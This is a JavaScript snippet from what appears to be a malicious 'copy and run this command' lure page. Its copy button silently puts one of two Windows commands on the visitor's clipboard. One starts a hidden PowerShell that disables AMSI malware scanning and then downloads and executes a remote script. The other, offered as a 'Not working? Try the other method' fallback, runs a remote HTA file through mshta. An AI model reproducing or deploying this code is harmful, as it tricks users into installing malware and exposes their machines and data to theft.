<script>
const host = location.host, t = Math.random().toString().slice(2,10);
const B = `cmd /c start /d "%SystemRoot%" /min powershell -nop -w hidden -ep bypass -c "$a=[Ref].Assembly.GetTypes()|?{$_.Name -like '*iUtils'};$f=$a.GetFields('NonPublic,Static')|?{$_.Name -eq 'amsiInitFailed'};$f.SetValue($null,$true);iex((New-Object Net.WebClient).DownloadString('https://${host}/s.txt?t=${t}'))"`;
const A = `mshta "https://${host}/p.hta?t=${t}"`;
let cur = B, alt = false;

const box = document.getElementById('cmd'), btn = document.getElementById('btn');
box.textContent = cur;

function copy(txt){
  const a = document.createElement('textarea');
  a.value = txt; a.style.position = 'fixed'; a.style.opacity = '0';
  document.body.appendChild(a); a.select(); document.execCommand('copy'); a.remove();
}

btn.onclick = () => {
  copy(cur);
  btn.textContent = 'Copied'; btn.classList.add('ok');
  setTimeout(() => { btn.textContent = 'Copy command'; btn.classList.remove('ok'); }, 1600);
};

document.getElementById('tr').onclick = () => {
  alt = !alt; cur = alt ? A : B; box.textContent = cur;
  btn.textContent = 'Copy command';
  document.getElementById('tr').textContent = alt ? 'Back to the first method' : 'Not working? Try the other method';
};
</script>
